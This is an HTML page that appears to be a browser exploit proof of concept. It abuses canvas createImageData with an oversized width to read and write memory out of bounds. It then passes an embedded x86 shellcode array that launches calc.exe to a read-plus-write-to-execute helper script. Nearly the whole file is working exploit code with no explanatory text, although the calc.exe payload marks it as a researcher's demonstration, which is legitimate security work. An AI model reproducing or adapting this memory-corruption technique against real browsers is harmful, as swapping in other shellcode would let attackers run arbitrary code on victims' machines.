<!doctype html>
<html>
  <head>
    <script src="readPlusWriteEqualsExecute.js"></script>
    <script src="Memory.js"></script>
    <script>
      function CanvasImageDataReadWriteSploit() {
        var oCanvas = document.createElement("canvas");
        var oContext2d = oCanvas.getContext("2d");
        this.oImageData = oContext2d.createImageData(0x17001337,1);
        function addressToOffset(iAddress) {
          return iAddress + (iAddress < 0x7fff0000 ? +0x80010000 : -0x7fff0000);
        }
        this.readByte = function CreateImageDataReadWriteSploit_readByte(iAddress) {
          var iByte = this.oImageData.data[addressToOffset(iAddress)];
          if (typeof(iByte) == "undefined") {
            throw new Error("Unfortunately, memory at address 0x" + iAddress.toString(16) + " cannot be read.");
          }
          return iByte;
        }
        this.writeByte = function CreateImageDataReadWriteSploit_writeByte(iAddress, iValue) {
          // There is no way to guarantee this will work.
          this.oImageData.data[addressToOffset(iAddress)] = iValue;
          if (this.readByte(iAddress) != iValue) {
            throw new Error("Unfortunately, memory at address 0x" + iAddress.toString(16) + " cannot be written to.");
          }
        }
      }
      window.onload = function() {
        var aiShellcode = [ // 80 bytes x86 calc.exe shellcode from http://code.google.com/p/win-exec-calc-shellcode/
          0x60, 0x31, 0xD2, 0x52, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x89, 0xE6, 0x52, 0x56, 0x64, 0x8B, 0x72, 0x30, 0x8B,
          0x76, 0x0C, 0x8B, 0x76, 0x0C, 0xAD, 0x8B, 0x30, 0x8B, 0x7E, 0x18, 0x8B, 0x5F, 0x3C, 0x8B, 0x5C, 0x1F, 0x78,
          0x8B, 0x74, 0x1F, 0x20, 0x01, 0xFE, 0x8B, 0x4C, 0x1F, 0x24, 0x01, 0xF9, 0x0F, 0xB7, 0x2C, 0x51, 0x42, 0xAD,
          0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xF1, 0x8B, 0x74, 0x1F, 0x1C, 0x01, 0xFE, 0x03, 0x3C, 0xAE,
          0xFF, 0xD7, 0x58, 0x58, 0x61, 0xC2, 0x04, 0x00 // With clean RET to allow browser to continue running.
        ];
        var oReadWriteSploit = new CanvasImageDataReadWriteSploit();
        readPlusWriteEqualsExecute(oReadWriteSploit, aiShellcode);
      };
    </script>
  </head>
</html>